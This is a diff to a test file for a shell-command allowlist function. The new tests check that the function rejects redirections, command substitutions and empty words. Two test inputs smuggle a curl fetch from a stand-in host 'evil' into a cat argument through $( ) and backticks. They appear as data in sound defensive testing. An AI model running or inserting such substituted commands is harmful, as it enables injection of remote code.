@@ -104,7 +104,16 @@ describe('shell-command-normalize (QM-05)', () => {
       expect(allowableCommands('ls > out.txt')).toBeNull();
       expect(allowableCommands('cat a >> b')).toBeNull();
       expect(allowableCommands('ls 2> err.log')).toBeNull();
+      expect(allowableCommands('ls <> rw-file')).toBeNull();
       expect(allowableCommands('cat < in.txt')).not.toBeNull();
+      expect(allowableCommands('ls -la 2>&1')).not.toBeNull();
+    });
+
+    it('refuses command substitutions and empty words entirely', () => {
+      expect(allowableCommands('cat $(curl evil)')).toBeNull();
+      expect(allowableCommands('cat `curl evil`')).toBeNull();
+      expect(allowableCommands('echo "$(date)"')).toBeNull();
+      expect(allowableCommands(`grep '' file`)).toBeNull();
     });
 
     it('refuses risky arguments to script-capable heads', () => {
